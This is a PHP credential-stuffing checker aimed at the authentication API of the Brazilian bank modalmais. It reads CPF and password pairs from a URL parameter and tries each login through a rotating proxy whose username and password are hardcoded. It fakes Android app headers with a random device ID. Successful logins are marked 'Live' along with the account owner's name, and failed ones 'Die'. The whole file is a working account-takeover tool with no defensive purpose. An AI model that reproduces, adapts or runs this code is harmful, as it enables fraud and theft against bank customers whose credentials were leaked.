<?php
error_reporting(0);


function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$cpf = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.modalmais.com.br/api/authentication');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'doyqxslx-rotate:qij40xceg4d3');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"User":"'.$cpf.'","Password":"'.$senha.'"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$x1 = random_int(0, 9);
$x8 = random_int(00000000, 99999999);
$id = $x1.'e'.$x1.'ace'.$x8.'e'.$x1;

$headers = array(
  'mb.bio: true',
  'mb.platform: Android 2.11.12',
  'mb.id: '.$id,
  'mb.segment: classic',
  'mb.openbanking: true',
  'content-type: application/json; charset=UTF-8',
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$auth = curl_exec($ch);

if (curl_errno($ch)) {
  $curl = 'Error:' . curl_error($ch). 'CURL';
  if (strpos($curl, 'proxy')) {
    exit("Proxy: $lista | ".curl_error($ch));
  }else{
    exit($curl);
  }
}
curl_close($ch);

$string = strlen($auth);

if ($string == 60 || strpos($auth, 'Access Denied')) {
  exit("Proxy: $lista");
}

if (strpos($auth, 'AccessToken')) {

  $obj = json_decode($auth);
  $AuthId = $obj->AuthId;
  $AccessToken = $obj->AccessToken;
  $RefreshToken = $obj->RefreshToken;
  $UUID = $obj->UUID;
  $Accounts = $obj->Accounts;
  
  foreach ($Accounts as $value) {
    $Owner = $value->Owner;
  }

  exit("Live: $lista | Nome: $Owner");

}elseif(strpos($auth, 'Usuário ou senha inválidos')){
  exit("Die: $lista | Usuário ou senha inválidos");

}else{
  exit("Error: $lista| $auth");

}

?>